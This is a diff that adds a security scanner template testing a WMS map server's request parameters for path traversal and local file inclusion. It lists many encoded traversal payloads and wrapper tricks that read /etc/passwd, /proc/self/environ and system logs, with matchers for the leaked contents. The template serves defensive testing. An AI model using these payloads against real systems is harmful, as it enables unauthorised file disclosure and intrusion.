@@ -1,0 +1,204 @@
+id: ogc-wms-path-traversal
+
+info:
+  name: OGC WMS Path Traversal / Local File Inclusion
+  author: weather-wms-security
+  severity: high
+  description: |
+    Tests for path traversal (Local File Inclusion) vulnerabilities in WMS parameters.
+    Targets include:
+    - LAYERS parameter (layer name could be used in file paths)
+    - STYLES parameter (style name could be used in file paths)
+    - FORMAT parameter (format string could be used in file operations)
+    
+    Tests various encoding techniques:
+    - Basic traversal (../)
+    - URL encoding (%2e%2e%2f)
+    - Double URL encoding (%252e%252e%252f)
+    - Backslash variants (for Windows)
+    - Null byte injection
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: lfi,path-traversal,wms,ogc
+
+variables:
+  base_crs: "EPSG:4326"
+  base_bbox: "-180,-90,180,90"
+
+http:
+  # Path traversal in LAYERS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{payload}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        # Basic traversal
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        # Dotdot-slash variations
+        - "....//....//etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "....//../....//../etc/passwd"
+        # URL encoded
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e/%2e%2e/etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        # Double URL encoded
+        - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        - "..%252f..%252fetc%252fpasswd"
+        # Backslash (Windows)
+        - "..\\..\\..\\..\\windows\\win.ini"
+        - "..\\..\\..\\..\\etc\\passwd"
+        # Mixed
+        - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+        # Null byte (bypass extension checks)
+        - "../../../../etc/passwd%00.png"
+        - "../../../../etc/passwd%00"
+        # Wrapper protocols (if supported)
+        - "file:///etc/passwd"
+        - "php://filter/convert.base64-encode/resource=/etc/passwd"
+        # Valid layer prefix + traversal
+        - "gfs_TMP/../../../etc/passwd"
+        - "gfs_TMP/../../../../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:[0-9]+:[0-9]+"
+          - "nobody:[x*]:"
+          - "www-data:"
+          - "postgres:"
+
+      - type: word
+        words:
+          - "[extensions]"
+          - "for 16-bit app support"
+          - "[fonts]"
+
+      - type: word
+        words:
+          - "root:x:0:0:root"
+          - "bin:x:1:1:bin"
+
+  # Path traversal in STYLES parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS=gfs_TMP&STYLES={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "....//....//etc/passwd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "default/../../../etc/passwd"
+        - "gradient/../../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: word
+        words:
+          - "[extensions]"
+
+  # Path traversal in FORMAT parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS=gfs_TMP&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT={{payload}}"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "image/../../../etc/passwd"
+        - "image/png/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in QUERY_LAYERS (GetFeatureInfo)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS=gfs_TMP&QUERY_LAYERS={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J=128&INFO_FORMAT=application/json"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "gfs_TMP/../../../etc/passwd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in INFO_FORMAT (GetFeatureInfo)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS=gfs_TMP&QUERY_LAYERS=gfs_TMP&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J=128&INFO_FORMAT={{payload}}"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "application/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Sensitive file enumeration
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{payload}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "../../../../proc/self/environ"
+        - "../../../../proc/self/cmdline"
+        - "../../../../proc/version"
+        - "../../../../etc/hostname"
+        - "../../../../etc/issue"
+        - "../../../../var/log/auth.log"
+        - "../../../../var/log/syslog"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "PATH="
+          - "HOME="
+          - "USER="
+          - "Linux version"
+          - "Ubuntu"
+          - "Debian"
+        condition: or
